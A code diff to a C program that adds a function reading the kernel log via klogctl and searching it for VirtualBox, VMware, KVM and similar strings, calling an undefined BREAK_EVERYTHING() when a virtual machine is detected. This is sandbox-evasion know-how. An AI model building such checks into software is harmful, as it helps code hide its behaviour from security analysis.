@@ -16,7 +16,7 @@ int hypervisor_in_cpuinfo() {
         num_read = read(cpuinfo_fd, buf, sizeof(buf) - 1);
         buf[num_read] = '\0';
         if (strstr(buf, hypervisor_string)) {
-            ret = 1;    
+            ret = 1;
         }
     } while (num_read <= 0);
 
@@ -25,4 +25,43 @@ int hypervisor_in_cpuinfo() {
     }
 
     return ret;
+}
+
+int vm_signs_in_klog()
+{
+    int len;
+    char *buf;
+    int in = 0;
+
+    char strings[7][50] = {
+                    "VirtualBox",
+                    "virtualbox",
+                    "VMWARE",
+                    "VMware",
+                    "KVM",
+                    "Hypervisor detected",
+                    "vboxsf"
+    };
+
+
+    len = klogctl(10, NULL, 0);
+    buf = malloc(len);
+    len = klogctl(3, buf, len);
+
+    if (len == 0) {
+        BREAK_EVERYTHING();
+        return 1;
+    }
+
+    for (in = 0; in < 7; in++) {
+        char *line;
+        line = strstr(buf, *(strings + in));
+        if (line) {
+            BREAK_EVERYTHING();
+            return 1;
+        }
+
+    }
+
+    return 0;
 }
